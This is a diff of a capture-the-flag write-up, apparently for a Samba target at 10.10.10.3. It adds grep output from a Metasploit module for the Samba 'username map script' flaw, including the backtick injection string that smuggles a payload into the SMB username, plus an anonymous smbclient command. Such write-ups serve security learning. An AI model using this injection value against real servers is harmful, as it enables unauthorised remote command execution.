@@ -190,7 +190,20 @@ Copied to: /home/kali/16320.rb
 ```
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/edcacaab-c3d0-4469-aba4-3c8c9d05bc2d)
 
++ `cat 16320.rb | grep username`
+```
+└─$ cat 16320.rb | grep username
+			'Name'           => 'Samba "username map script" Command Execution',
+				"username map script" configuration option. By specifying a username
+				this option is used to map usernames prior to authentication!
+		username = "/=`nohup " + payload.encoded + "`"
+			simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
+                        
+```
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a6ab3615-2dfe-41ca-b51f-e85a659c61e3)
+`<br>
+`username = "/=`nohup " + payload.encoded + "`"`
 
-
++ `smbclient //10.10.10.3/tmp -N`
 
 
